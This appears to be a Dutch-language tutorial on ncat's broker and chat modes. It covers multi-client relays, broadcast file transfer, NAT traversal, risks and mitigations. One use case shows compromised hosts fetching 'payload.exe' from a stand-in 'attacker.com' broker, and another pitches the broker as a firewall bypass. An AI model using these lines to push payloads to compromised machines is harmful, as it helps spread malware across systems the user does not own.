## 🌐 Connection Brokering

**Connection brokering** is een unieke ncat feature waarbij één listening ncat **meerdere clients** accepteert en **alles van één client wordt doorgestuurd naar alle anderen**.

**Denk aan het als:**
- Network hub (broadcast naar everyone)
- Group chat systeem
- Multi-client relay

---

## 🔀 Hoe Broker Mode Werkt

### Normal Listen Mode (no broker)

```bash
ncat -l 4444
```

**Gedrag:**
- Accept **één connection**
- Quit na disconnect
- Data gaat: client ↔ server

### Broker Mode

```bash
ncat -l --broker 4444
```

**Gedrag:**
- Accept **meerdere connections**
- Blijft draaien (tot `Ctrl+C`)
- Data gaat: client1 → broker → **all other clients**

::important
**Broker mode requires `--listen`:**
```bash
ncat -l --broker 4444  # ✅ Correct
ncat --broker 4444      # ❌ Error: broker mode alleen in listen mode
```
::

## 💬 Multi-User Chat

### Basic Chat Setup

**Server (broker):**
```bash
ncat -l --broker 4444
```

**Client 1:**
```bash
ncat server.ip 4444
Hello from Client 1!
```

**Client 2:**
```bash
ncat server.ip 4444
Hi from Client 2!
```

**Client 3:**
```bash
ncat server.ip 4444
Client 3 here!
```

**Wat gebeurt:**
- Client 1 type → Client 2 & 3 zien het
- Client 2 type → Client 1 & 3 zien het
- Client 3 type → Client 1 & 2 zien het

::note
**Probleem:** Geen user identification — je weet niet **wie** wat zegt.
::

## 🎭 Chat Mode — `--chat`

### Wat Is Chat Mode?

```bash
ncat -l --chat 4444
```

**Features:**
- Automatisch **connection brokering** enabled
- Elke message krijgt **unique ID prefix**
- Control characters worden **escaped**

---

### Chat In Actie

**Server:**
```bash
$ ncat -l --chat 4444
```

**Client 1 connects:**
```bash
$ ncat server.ip 4444
<user0> Welcome to the chat!
Hello everyone!
```

**Client 2 connects:**
```bash
$ ncat server.ip 4444
<user6> Hello everyone!
Hi there!
```

**Client 3 (de server zelf) type:**
```bash
$ ncat -l --chat 4444
<user6> Hello everyone!
<user2> Hi there!
Go away, all of you.
```

**Wat clients zien:**
```
Client 1 ziet:
<user2> Hi there!
<user0> Go away, all of you.

Client 2 ziet:
<user6> Hello everyone!
<user0> Go away, all of you.
```

---

### User IDs

**Hoe worden IDs gegenereerd?**
- Gebaseerd op **file descriptor** van connection
- **Arbitrary** — geen controle over assignment
- **Niet persistent** — nieuwe ID bij reconnect

::caution
**Limitations:**
- Geen username selection
- IDs kunnen weird nummers zijn (user6, user12, etc.)
- Geen persistence tussen sessions
::

## 📁 File Sharing Via Broker

Broker mode kan ook gebruikt worden voor **multi-recipient file distribution**:

### Scenario: Eén Sender, Meerdere Receivers

**Broker (intermediary host):**
```bash
ncat -l --broker 31337
```

**Receivers (connect first!):**
```bash
# Receiver 1:
ncat broker.ip 31337 > received-file-1.txt

# Receiver 2:
ncat broker.ip 31337 > received-file-2.txt

# Receiver 3:
ncat broker.ip 31337 > received-file-3.txt
```

**Sender:**
```bash
ncat --send-only broker.ip 31337 < file-to-distribute.txt
```

**Resultaat:**
- Alle receivers krijgen **dezelfde file**
- Broadcast via broker

::important
**Receivers moeten connecten VOOR sender** — broker buffert geen data!
::

## 🔄 NAT Bypass Via Broker

Wanneer **beide hosts achter NAT** zitten en elkaar niet direct kunnen bereiken:

```
Host A (NAT) ◄──► Public Broker ◄──► Host B (NAT)
```

**Use case:** Twee machines op verschillende private netwerken willen communiceren.

**Broker (public server met static IP):**
```bash
ncat -l --broker 31337
```

**Host A:**
```bash
ncat broker.com 31337
Hello from behind NAT A!
```

**Host B:**
```bash
ncat broker.com 31337
<user5> Hello from behind NAT A!
Greetings from NAT B!
```

**Traffic flow:**
Host A → Broker (public) → Host B

## ⚙️ Broker Behavior & Characteristics

### Connection Management

| Aspect | Behavior |
|--------|----------|
| **Accept connections** | Unlimited (tot system limits) |
| **Disconnect handling** | Other clients blijven connected |
| **Quit condition** | Never (manual `Ctrl+C` only) |
| **Buffering** | None — real-time relay |

### Data Flow

```
Client 1 sends "Hello"
    ↓
Broker receives
    ↓
Broker broadcasts to:
    → Client 2
    → Client 3
    → Client 4
    → ... (all except sender)
```

::note
**Sender ziet NIET zijn eigen messages terug** (unless another client echoes).
::

## 🎯 Practical Use Cases

### Use Case 1: Team Communication During Pentest

**Setup:**
```bash
# Op shared server:
ncat -l --chat 4444
```

**Team members connect:**
```bash
ncat server.ip 4444
```

**Benefits:**
- Quick coordination
- No external chat tools needed
- Terminal-based (SSH-friendly)

---

### Use Case 2: Multi-Target File Distribution

**Distribute payload naar meerdere compromised hosts:**

```bash
# Broker op attacker-controlled server:
ncat -l --broker 8080

# Compromised hosts (receivers):
ncat attacker.com 8080 > payload.exe

# Send payload:
ncat --send-only attacker.com 8080 < payload.exe
```

---

### Use Case 3: Firewall Bypass Relay

**Situation:** Twee internal hosts kunnen **broker bereiken** maar **niet elkaar**.

```bash
# External broker:
ncat -l --broker 31337

# Internal Host A:
ncat broker.com 31337 < data.txt

# Internal Host B:
ncat broker.com 31337 > data.txt
```

## 🛡️ Security Considerations

### Risks

| Risk | Impact |
|------|--------|
| **No authentication** | Anyone kan connecten |
| **Plaintext communication** | Network sniffing mogelijk |
| **Message injection** | Any client kan fake messages sturen |
| **DoS vulnerability** | Attacker kan spam/flood |

### Mitigations

**1. IP Restrictions:**
```bash
ncat -l --broker --allow 192.168.0.0/24 4444
```

**2. Encryption:**
```bash
ncat -l --broker --ssl --ssl-cert cert.pem --ssl-key key.pem 4444
```

**3. Connection Limits:**
```bash
ncat -l --broker --max-conns 10 4444
```

**4. Monitoring:**
```bash
ncat -vv -l --broker 4444  # Verbose logging
```

::warning
**Never expose public broker zonder authentication/encryption** — dit is een open relay voor **anyone** op internet!
::

```bash
# ═══════════════════════════════════════════════════
# CONNECTION BROKER
# ═══════════════════════════════════════════════════

# Basic broker:
ncat -l --broker 4444

# CHAT MODE
# ═══════════════════════════════════════════════════

# Basic chat server:
ncat -l --chat 4444

# Chat met access control:
ncat -l --chat --allow 192.168.0.0/24 4444

# Encrypted chat:
ncat -l --chat --ssl --ssl-cert cert.pem --ssl-key key.pem 4444

# ═══════════════════════════════════════════════════
# CLIENTS
# ═══════════════════════════════════════════════════

# Connect to broker/chat:
ncat server.ip 4444

# Connect met SSL:
ncat --ssl server.ip 4444

# ═══════════════════════════════════════════════════
# FILE DISTRIBUTION VIA BROKER
# ═══════════════════════════════════════════════════

# Broker:
ncat -l --broker 31337

# Receivers (connect first!):
ncat broker.ip 31337 > file

# Sender:
ncat --send-only broker.ip 31337 < file
```
